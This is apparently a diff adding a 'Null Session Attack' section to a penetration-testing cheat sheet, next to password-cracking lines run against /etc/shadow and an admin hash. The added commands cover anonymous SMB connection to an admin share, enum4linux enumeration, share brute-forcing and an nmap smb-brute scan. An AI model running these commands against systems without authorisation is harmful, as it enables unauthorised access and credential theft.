@@ -31,3 +31,27 @@ hashcat -m 1800 admin.hash /root/Desktop/wordlists/1000000-password-seclists.txt
 john /etc/shadow --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt
 
 ```
+
+#### nULl Session Attack
+
+> Allows user to connect to network without valid password in windows server.
+
+```
+smbclient //10.10.10.10/C$ -N
+
+enum4linux -n 192.168.23.1 >> NBT stat
+
+enum4linux -P 192.168.23.1 >> GIVES PASSWORD POLICY ON REMOTE MACHINE
+
+enum4linux -S 192.168.23.1 >> LIST SHARES
+
+enum4linux -s /usr/share/enum4linux/share-list.txt 192.168.23.1  >> Bruteforce Shares
+
+enum4linux -A 192.168.23.1 >> FULL ENUM
+
+sambrdump.py 192.168.23.1 
+
+nmap -script=smb-enum-shares,smb-enum-users,smb-brute 192.168.23.1
+
+
+```
